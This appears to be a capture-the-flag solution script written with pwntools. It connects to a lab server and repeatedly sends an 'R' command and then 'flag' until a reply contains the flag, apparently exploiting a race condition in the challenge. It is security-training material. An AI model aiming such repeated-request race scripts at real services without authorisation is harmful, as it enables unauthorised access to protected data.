#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

r = remote('up.zoolab.org', 10931)
for i in range(1000):
    r.sendline(b'R')
    # print(r.recvline())
    r.sendline(b'flag')
    # print(r.recvline())
    data = r.recvline()
    if b'FLAG' in data:
        print(data)
        break

r.close()